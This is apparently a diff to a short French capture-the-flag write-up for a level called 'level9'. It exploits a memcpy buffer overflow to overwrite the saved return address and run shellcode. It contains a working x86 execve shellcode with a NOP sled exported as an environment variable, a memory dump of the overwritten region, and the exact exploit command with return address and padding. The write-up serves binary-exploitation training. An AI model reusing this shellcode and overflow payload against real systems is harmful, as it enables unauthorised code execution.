@@ -1,3 +1,15 @@
+dans le niveau9 on va ce servir de la fonction memcpy qui est vulnerable au buffer overflow, pour reecrire l'EIP de la fonction main afin d'appeler un shellcode appelant la fonction /bin/bash
+
 export SHELLCODE=`python -c 'print("\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'`
+
+portion de la memoire reecrite
+0xbffff830:	0x6c657665	0x656c2f39	0x396c6576	0xfff8d000
+0xbffff840:	0x414141bf	0x41414141	0x41414141	0x41414141
+0xbffff850:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff860:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff870:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff880:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff890:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff8a0:	0x41414141	0x41414141	0x04a00c41	0x48530008
 
 ./level9 `python -c 'print("\xd0\xf8\xff\xbf" + "A" * 104 + "\x0c\xa0\x04\x08")'`
